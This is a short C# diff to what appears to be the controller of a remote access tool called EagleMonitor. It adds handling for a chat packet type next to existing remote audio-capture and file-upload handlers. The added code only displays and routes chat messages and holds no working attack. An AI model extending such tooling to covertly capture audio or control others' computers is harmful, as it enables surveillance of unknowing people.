@@ -85,6 +85,10 @@ namespace EagleMonitor.Networking
                         else
                             row.Cells["Column5"].Value = Miscellaneous.SplitPath(((UploadFilePacket)packet).path) + " NOT UPLOADED";
                         break;
+
+                    case PacketType.CHAT_ON:
+                        row.Cells["Column5"].Value = ((RemoteChatPacket)packet).msg;
+                        break;
                 }
                 Program.logForm.dataGridView1.ClearSelection();
                 Program.logForm.dataGridView1.CurrentCell = null;
@@ -208,6 +212,11 @@ namespace EagleMonitor.Networking
                 case PacketType.AUDIO_RECORD_ON:
                     RemoteAudioCapturePacket remoteAudioCapturePacket = (RemoteAudioCapturePacket)packet;
                     new RemoteAudioCapturePacketHandler(remoteAudioCapturePacket, clientHandler);
+                    break;
+
+                case PacketType.CHAT_ON:
+                    RemoteChatPacket chatPacket = (RemoteChatPacket)packet;
+                    new ChatPacketParser(chatPacket, clientHandler);
                     break;
 
             }
